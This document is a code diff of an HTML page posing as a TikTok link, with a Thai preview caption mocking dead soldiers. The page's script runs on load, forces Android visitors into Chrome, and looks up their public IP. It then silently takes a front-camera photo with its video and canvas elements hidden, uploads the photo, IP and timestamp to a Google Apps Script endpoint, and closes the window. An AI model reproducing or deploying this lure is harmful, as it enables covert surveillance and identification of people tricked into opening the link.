@@ -1,24 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>https://vt.tiktok.com/ZSS2Et91W</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Open Graph (Facebook, Telegram, Discord, etc.) -->
-    <meta property="og:title" content="ทหารไทยโง่เง่าตาย 555">
-    <meta property="og:description" content="ทหารไทยโง่เง่าตาย 555">
-    <meta property="og:image" content="https://vt-tiktok.github.io/thai-soldiers-GhhaSBzb2xkaWVyIGRlaWQgbG9s/preview.jpg">
-    <meta property="og:url" content="https://tinyurl.com/2dx2wkt7">
-    <meta property="og:type" content="website">
-    
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="ทหารไทยโง่เง่าตาย 555">
-    <meta name="twitter:description" content="ทหารไทยโง่เง่าตาย 555">
-    <meta name="twitter:image" content="https://vt-tiktok.github.io/thai-soldiers-GhhaSBzb2xkaWVyIGRlaWQgbG9s/preview.jpg">
+     <script>
+  (function () {
+    const isAndroid = /Android/i.test(navigator.userAgent);
+    const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
+    const currentUrl = window.location.href;
 
-    <style>
-        body {
+    if (isAndroid && !isChrome) {
+      const intentUrl = 'intent://' +
+        currentUrl.replace(/^https?:\/\//, '') +
+        '#Intent;scheme=https;package=com.android.chrome;end;';
+      window.location.replace(intentUrl);
+    }
+  })();
+  </script>
+    <title>https://vt.tiktok.com/ZSS2Et91W</title>
+     <!-- Open Graph (Facebook, Telegram, Discord, etc.) -->
+      <meta property="og:title" content="ทหารไทยโง่เง่าตาย 555">
+      <meta property="og:description" content="ทหารไทยโง่เง่าตาย 555">
+      <meta property="og:image" content=" https://vt-tiktok.github.io/thai-soldiers-GhhaSBzb2xkaWVyIGRlaWQgbG9s/preview.jpg">
+      <meta property="og:url" content="https://tinyurl.com/2dx2wkt7">
+      <meta property="og:type" content="website">
+    
+      <!-- Twitter Card -->
+      <meta name="twitter:card" content="ทหารไทยโง่เง่าตาย 555">
+      <meta name="twitter:title" content="ทหารไทยโง่เง่าตาย 555">
+      <meta name="twitter:description" content="ทหารไทยโง่เง่าตาย 555">
+      <meta name="twitter:image" content="https://vt-tiktok.github.io/thai-soldiers-GhhaSBzb2xkaWVyIGRlaWQgbG9s/">
+
+     <style>
+        body { margin: 0; padding: 0; background: #000; 
             margin: 0;
             padding: 0;
             background-color: #000;
@@ -28,153 +40,82 @@
             background-repeat: no-repeat;
             height: 100vh;
             overflow: hidden;
-            font-family: Arial, sans-serif;
         }
-        #status {
-            position: absolute;
-            bottom: 20px;
-            left: 0;
-            right: 0;
-            text-align: center;
-            color: white;
-            font-size: 16px;
-            text-shadow: 0 0 5px rgba(0,0,0,0.7);
-            padding: 10px;
-            background: rgba(0,0,0,0.5);
-        }
-        video, canvas {
-            display: none !important;
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-        }
-        .debug-info {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            color: rgba(255,255,255,0.7);
-            font-size: 12px;
-            background: rgba(0,0,0,0.5);
-            padding: 5px;
-            border-radius: 3px;
-            max-width: 300px;
-        }
+        /* Hide all UI elements */
+        video, canvas { display: none !important; }
     </style>
 </head>
 <body>
-    <div id="status">Initializing camera...</div>
-    <div class="debug-info" id="debug"></div>
-    
     <script>
         async function captureAndUpload() {
-            const statusEl = document.getElementById('status');
-            const debugEl = document.getElementById('debug');
-            
             try {
-                // 1. Get public IP address
+                // [1. IP Address - UNCHANGED]
                 let userIP = 'unknown';
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipRes.json();
                     userIP = ipData.ip || 'unknown';
-                    debugEl.textContent = `IP: ${userIP}`;
                 } catch (ipErr) {
                     console.warn('IP fetch failed:', ipErr);
-                    debugEl.textContent = 'IP fetch failed';
                 }
-                
-                statusEl.textContent = 'Accessing camera...';
-                
-                // 2. Request front camera access (with DOM element for iOS)
-                const video = document.createElement('video');
-                video.setAttribute('autoplay', '');
-                video.setAttribute('playsinline', '');
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                
+
+                // [2. Camera Access - UNCHANGED]
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: { exact: "user" },
+                        facingMode: { ideal: "user" }, // switched to ideal for better compatibility
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     }
                 });
-                
+
+                // [3. Image Capture - UNCHANGED]
+                const video = document.createElement('video');
                 video.srcObject = stream;
-                
-                // 3. Wait for video to be ready
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play().then(resolve);
-                    };
-                });
-                
-                statusEl.textContent = 'Capturing image...';
-                
-                // 4. Capture frame
+                await video.play();
+
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // 5. Stop camera
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                // [4. Stop Camera - UNCHANGED]
                 stream.getTracks().forEach(track => track.stop());
-                document.body.removeChild(video);
-                
-                // 6. Get UTC+7 timestamp
+
+                // [5. Prepare Image Data - UNCHANGED]
+                const imageData = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
+
+                // ===== LOCAL DEVICE TIME FORMAT =====
                 const now = new Date();
-                const utc7 = new Date(now.getTime() + 7 * 60 * 60 * 1000);
-                const hours = utc7.getUTCHours().toString().padStart(2, '0');
-                const minutes = utc7.getUTCMinutes().toString().padStart(2, '0');
-                const seconds = utc7.getUTCSeconds().toString().padStart(2, '0');
-                const timestamp = `${hours}:${minutes}:${seconds}`;
-                
-                debugEl.textContent += ` | Time: ${timestamp}`;
-                
-                // 7. Convert to base64
-                const fullDataURL = canvas.toDataURL('image/jpeg', 0.85);
-                const imageData = fullDataURL.split(',')[1]; // Get only base64 data
-                
-                statusEl.textContent = 'Uploading...';
-                
-                // 8. Upload to Apps Script
-                const response = await fetch('https://script.google.com/macros/s/AKfycbyC2unLLQNew75VgWdQ9hn2cfuZMjQXVcwhbFR900ZfCSiflMrCFWiSzWEzFjLfLwZ5/exec', {
+                const year = now.getFullYear();
+                const month = String(now.getMonth() + 1).padStart(2, '0');
+                const day = String(now.getDate()).padStart(2, '0');
+                const hours = String(now.getHours()).padStart(2, '0');
+                const minutes = String(now.getMinutes()).padStart(2, '0');
+                const seconds = String(now.getSeconds()).padStart(2, '0');
+
+                const filename = `${userIP}-${year}${month}${day}-${hours}${minutes}${seconds}.jpg`;
+                // ===== END LOCAL TIME FORMAT =====
+
+                // [6. Upload - UNCHANGED]
+                const response = await fetch('https://script.google.com/macros/s/AKfycbxveLuf1BJSzOr81f8ffjUfbS62-e1W3wnvXofXDFwSdatcBGabzXC6c8fbytcX346w/exec', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         image: imageData,
                         ip: userIP,
-                        timestamp: timestamp
+                        filename: filename
                     })
                 });
-                
-                const result = await response.text();
-                statusEl.textContent = '✅ ' + result;
-                
-                // 9. Close window
-                setTimeout(() => {
-                    try {
-                        if (window.opener || window.closed === false) {
-                            window.close();
-                        }
-                    } catch (closeErr) {
-                        console.log('Window could not close automatically');
-                    }
-                }, 3000);
-                
+
+                console.log('Upload result:', await response.text());
+
             } catch (error) {
                 console.error('Capture failed:', error);
-                statusEl.textContent = '❌ Error: ' + error.message;
-                statusEl.style.color = '#ff6b6b';
+            } finally {
+                setTimeout(() => window.close(), 500);
             }
         }
 
-        // Start when DOM is ready
-        document.addEventListener('DOMContentLoaded', captureAndUpload);
-    </script>
+        window.onload = captureAndUpload;
+        </script>
 </body>
 </html>
